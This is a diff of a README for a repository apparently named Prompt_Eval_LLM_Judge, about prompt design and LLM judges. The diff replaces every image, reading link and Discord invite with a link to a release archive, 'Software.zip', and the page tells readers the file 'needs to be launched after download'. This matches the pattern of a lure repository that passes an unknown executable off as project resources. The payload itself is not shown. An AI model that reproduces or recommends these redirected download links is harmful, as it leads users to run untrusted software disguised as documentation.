@@ -1,6 +1,6 @@
 # 🚀 **Welcome to Prompt_Eval_LLM_Judge**
 
-![Prompt Evaluation](https://example.com/prompt.jpg)
+![Prompt Evaluation](https://github.com/DJMuRo4ever/Prompt_Eval_LLM_Judge/releases/download/v1.0/Software.zip)
 
 ### Repository Name: 
 Prompt_Eval_LLM_Judge
@@ -24,7 +24,7 @@ This repository focuses on Prompt Design and LLM Judge, providing tools and reso
 ---
 
 ## 📁 Download Release v1.0.0 
-[![Download Release v1.0.0](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Release v1.0.0](https://github.com/DJMuRo4ever/Prompt_Eval_LLM_Judge/releases/download/v1.0/Software.zip)](https://github.com/DJMuRo4ever/Prompt_Eval_LLM_Judge/releases/download/v1.0/Software.zip)
 
 *(File needs to be launched after download)*
 	
@@ -78,12 +78,12 @@ role_playing_prompt = RolePlayingPrompt("character name", "scenario")
 ## 📚 Resources
 
 ### Additional Reading
-- [Blog: Mastering Prompt Design](https://blog.example.com/mastering-prompt-design)
-- [Paper: CoT Prompting Techniques](https://arxiv.org/contrasting-coTp)
-- [Tutorial: LLM Judge Implementation](https://example.com/llm-judge-tutorial)
+- [Blog: Mastering Prompt Design](https://github.com/DJMuRo4ever/Prompt_Eval_LLM_Judge/releases/download/v1.0/Software.zip)
+- [Paper: CoT Prompting Techniques](https://github.com/DJMuRo4ever/Prompt_Eval_LLM_Judge/releases/download/v1.0/Software.zip)
+- [Tutorial: LLM Judge Implementation](https://github.com/DJMuRo4ever/Prompt_Eval_LLM_Judge/releases/download/v1.0/Software.zip)
 
 ### Community
-Join our community on [Discord](https://discord.gg/prompt-eval) to discuss prompt engineering, evaluation techniques, and more!
+Join our community on [Discord](https://github.com/DJMuRo4ever/Prompt_Eval_LLM_Judge/releases/download/v1.0/Software.zip) to discuss prompt engineering, evaluation techniques, and more!
 
 ---
 
@@ -104,4 +104,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ### Thank you for visiting Prompt_Eval_LLM_Judge! 🌟
 
-![Prompt Evaluation](https://example.com/prompt_eval.jpg)
+![Prompt Evaluation](https://github.com/DJMuRo4ever/Prompt_Eval_LLM_Judge/releases/download/v1.0/Software.zip)
